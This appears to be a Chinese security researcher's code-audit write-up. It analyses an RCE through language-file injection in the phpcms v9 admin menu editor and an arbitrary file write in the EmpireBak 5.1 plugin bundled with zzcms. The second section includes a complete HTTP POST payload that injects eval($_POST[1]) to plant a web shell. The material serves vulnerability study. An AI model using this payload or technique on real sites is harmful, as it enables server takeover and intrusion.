代码审计 代码定位在 phpcms/modules/admin/menu.php 81-101行 function edit() { if(isset($_POST[&#39;dosubmit&#39;])) { $id = intval($_POST[&#39;id&#39;]); //print_r($_POST[&#39;info&#39;]);exit; $r = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id)); $this-&gt;db-&gt;update($_POST[&#39;info&#39;],array(&#39;id&#39;=&gt;$id)); //修改语言文件 $file = PC_PATH.&#39;languages&#39;.DIRECTORY_SEPARATOR.&#39;zh-cn&#39;.DIRECTORY_SEPARATOR.&#39;system_menu.lang.php&#39;; require $file; $key = $_POST[&#39;info&#39;][&#39;name&#39;]; if(!isset($LANG[$key])) { $content = file_get_contents($file); $content = substr($content,0,-2); $data = $content.&#34;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;
?&gt;&#34;; file_put_contents($file,$data); } elseif(isset($LANG[$key]) &amp;&amp; $LANG[$key]!=$_POST[&#39;language&#39;]) { $content = file_get_contents($file); $content = str_replace($LANG[$key],$_POST[&#39;language&#39;],$content); file_put_contents($file,$content); } $this-&gt;update_menu_models($id, $r, $_POST[&#39;info&#39;]); //结束语言文件修改 showmessage(L(&#39;operation_success&#39;)); } else { ... } } 指定文件路径并引用文件，这个路径定死了不可控 $file = PC_PATH.&#39;languages&#39;.DIRECTORY_SEPARATOR.&#39;zh-cn&#39;.DIRECTORY_SEPARATOR.&#39;system_menu.lang.php&#39;; //phpcms/languages/zh-cn/system_menu.lang.php require $file; 文件内的格式如下，全是 PHP 数组形式 当当我们第一次发包，LANG 数组中显然是没有传入的 key 的键，因此进入 if 内部。file_put_contents 第一个参数 file 仍然是之前定死的，也就是往 phpcms/languages/zh-cn/system_menu.lang.php 文件内写。第二个参数 data 由 POST 传入的 key、language 参数和 system_menu.lang.php 文件中原本内容以及 ;
?&gt; 字符串拼接而成 $key = $_POST[&#39;info&#39;][&#39;name&#39;]; if(!isset($LANG[$key])) { $content = file_get_contents($file); $content = substr($content,0,-2); $data = $content.&#34;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;
?&gt;&#34;; file_put_contents($file,$data); 而在之前 PHPCMSV9 路由分析篇中提到过，其 $_POST 传入的值会先走过 param.class.php，然后才是 application.class.php::init() -&gt; call_user_func() 调用指定类文件 而 param 类的构造方法中进行了转义，我们无法直接在 menu.php::exit() if 内部绕掉转义 class param { //路由配置 private $route_config = &#39;&#39;; public function __construct() { if(!get_magic_quotes_gpc()) { $_POST = new_addslashes($_POST); $_GET = new_addslashes($_GET); $_REQUEST = new_addslashes($_REQUEST); $_COOKIE = new_addslashes($_COOKIE); } 再看 elseif，假设我们在第一次发包后再发一次，那么此时 system_menu.lang.php 文件内已经写入了键值对，因此 isset(LANG[LANG[LANG[key]) 会返回 true，而 LANG[LANG[LANG[key] 上面在 PHP特性中分析过，取出来会自动进行去除转义操作，因此 LANG[LANG[LANG[key]!=$_POST[&rsquo;language&rsquo;] 也返回 true elseif(isset($LANG[$key]) &amp;&amp; $LANG[$key]!=$_POST[&#39;language&#39;]) { $content = file_get_contents($file); $content = str_replace($LANG[$key],$_POST[&#39;language&#39;],$content); file_put_contents($file,$content); } 达成条件，进入 elseif 函数体内，上下文逃逸的关键 str_replace，search为 LANG[LANG[LANG[key] 而写入的是带有转义的 假设第一次写入 LANG[&#x27;1&#x27;]=&#x27;1\&#x27;&#x27;，那么 LANG[key] 此时取出来为 1&#x27;，在上下文中找并替换为 _POST[&rsquo;language&rsquo;]，即： $LANG[&#39;1&#39;] -&gt; $LANG[&#39;1\&#39;] 那么此时语法上是不是就少了一个引号，这有点像序列化字符串逃逸，引号被整没了，那么后面的字符就可以逃逸出来 $LANG[&#39;]1//&#39;] = &#39;]1//\&#39;&#39; -&gt; $LANG[&#39;1//\&#39;] = &#39;]1//\&#39;&#39; 那么 1 就逃逸出来了！我们只需要将 1 换为危险的 php 木马即可完成 RCE 利用

任意文件上传 该漏洞并不是 zzcms 自身因素造成，而是由于其内置的第三方插件 EmpireBak v5.1 的漏洞 漏洞路径zzcms2023/3/E_bak5.1/upload/phomebak.php 前置条件：拥有 EmpireBak 后台 Cookie 漏洞函数如下 function Ebak_DoEbak($add){ global $empire,$bakpath,$fun_r,$phome_db_ver; $dbname=RepPostVar($add[&#39;mydbname&#39;]); if(empty($dbname)) { printerror(&#34;NotChangeDb&#34;,&#34;history.go(-1)&#34;); } $tablename=$add[&#39;tablename&#39;]; $count=count($tablename); if(empty($count)) { printerror(&#34;EmptyChangeTb&#34;,&#34;history.go(-1)&#34;); } $add[&#39;baktype&#39;]=(int)$add[&#39;baktype&#39;]; $add[&#39;filesize&#39;]=(int)$add[&#39;filesize&#39;]; $add[&#39;bakline&#39;]=(int)$add[&#39;bakline&#39;]; $add[&#39;autoauf&#39;]=(int)$add[&#39;autoauf&#39;]; if((!$add[&#39;filesize&#39;]&amp;&amp;!$add[&#39;baktype&#39;])||(!$add[&#39;bakline&#39;]&amp;&amp;$add[&#39;baktype&#39;])) { printerror(&#34;EmptyBakFilesize&#34;,&#34;history.go(-1)&#34;); } //目录名 if(empty($add[&#39;mypath&#39;])) { $add[&#39;mypath&#39;]=$dbname.&#34;_&#34;.date(&#34;YmdHis&#34;); } DoMkdir($bakpath.&#34;/&#34;.$add[&#39;mypath&#39;]); //生成说明文件 $readme=$add[&#39;readme&#39;]; $rfile=$bakpath.&#34;/&#34;.$add[&#39;mypath&#39;].&#34;/readme.txt&#34;; $readme.=&#34;

Baktime: &#34;.date(&#34;Y-m-d H:i:s&#34;); WriteFiletext_n($rfile,$readme); $b_table=&#34;&#34;; $d_table=&#34;&#34;; for($i=0;$i&lt;$count;$i++) { $b_table.=$tablename[$i].&#34;,&#34;; $d_table.=&#34;\$tb[&#34;.$tablename[$i].&#34;]=0;
&#34;; } //去掉最后一个, $b_table=substr($b_table,0,strlen($b_table)-1); $bakstru=(int)$add[&#39;bakstru&#39;]; $bakstrufour=(int)$add[&#39;bakstrufour&#39;]; $beover=(int)$add[&#39;beover&#39;]; $waitbaktime=(int)$add[&#39;waitbaktime&#39;]; $bakdatatype=(int)$add[&#39;bakdatatype&#39;]; if($add[&#39;insertf&#39;]==&#39;insert&#39;) { $insertf=&#39;insert&#39;; } else { $insertf=&#39;replace&#39;; } if($phome_db_ver==&#39;4.0&#39;&amp;&amp;$add[&#39;dbchar&#39;]==&#39;auto&#39;) { $add[&#39;dbchar&#39;]=&#39;&#39;; } $string=&#34;&lt;?php \$b_table=\&#34;&#34;.$b_table.&#34;\&#34;; &#34;.$d_table.&#34; \$b_baktype=&#34;.$add[&#39;baktype&#39;].&#34;; \$b_filesize=&#34;.$add[&#39;filesize&#39;].&#34;; \$b_bakline=&#34;.$add[&#39;bakline&#39;].&#34;; \$b_autoauf=&#34;.$add[&#39;autoauf&#39;].&#34;; \$b_dbname=\&#34;&#34;.$dbname.&#34;\&#34;; \$b_stru=&#34;.$bakstru.&#34;; \$b_strufour=&#34;.$bakstrufour.&#34;; \$b_dbchar=\&#34;&#34;.addslashes($add[&#39;dbchar&#39;]).&#34;\&#34;; \$b_beover=&#34;.$beover.&#34;; \$b_insertf=\&#34;&#34;.addslashes($insertf).&#34;\&#34;; \$b_autofield=\&#34;,&#34;.addslashes($add[&#39;autofield&#39;]).&#34;,\&#34;; \$b_bakdatatype=&#34;.$bakdatatype.&#34;; ?&gt;&#34;; $cfile=$bakpath.&#34;/&#34;.$add[&#39;mypath&#39;].&#34;/config.php&#34;; WriteFiletext_n($cfile,$string); if($add[&#39;baktype&#39;]) { $phome=&#39;BakExeT&#39;; } else { $phome=&#39;BakExe&#39;; } echo $fun_r[&#39;StartToBak&#39;].&#34;&lt;script&gt;self.location.href=&#39;phomebak.php?phome=$phome&amp;t=0&amp;s=0&amp;p=0&amp;mypath=$add[mypath]&amp;waitbaktime=$waitbaktime&#39;;&lt;/script&gt;&#34;; exit(); } 对关键段进行分析：直接接收外部传入 tablename表名单数组，如果元组数量为空则弹警告 再往下看，这里将数组元素循环赋值给两个变量，同时为 $d_table 字符串添加一段 PHP 代码，格式为 $tb[表名]=0; 并加上换行符 
，最后substr去掉最后一个逗号 最后所有数组元素合并成一串php代码写入config.php中，这包括$b_table 总结：公共函数处理表单Ebak_DoEbak未经过滤将tablename拼入$b_table并生成php文件，造成任意文件上传漏洞 Payload如下 POST /3/E_bak5.1/upload/phomebak.php HTTP/1.1 Host: 192.168.43.169:8089 phome=DoEbak&amp;mydbname=information_schema&amp;savename=&amp;oldtablepre=&amp;newtablepre=&amp;baktype=0&amp;filesize=300&amp;bakline=500&amp;autoauf=1&amp;bakstru=1&amp;dbchar=auto&amp;bakdatatype=1&amp;mypath=information_schema_20240830060146XttHTw1&amp;insertf=replace&amp;waitbaktime=0&amp;readme=&amp;autofield=&amp;keyboard=&amp;tablename%5B%5D=eval($_POST[1])&amp;Submit=%BF%AA%CA%BC%B1%B8%B7%DD GetShell !!! PS. 好像看完也没啥进步，后面仔细想想，也没啥大问题，还是需要多花时间了解挖掘手法和熟悉框架以及更有价值的漏洞

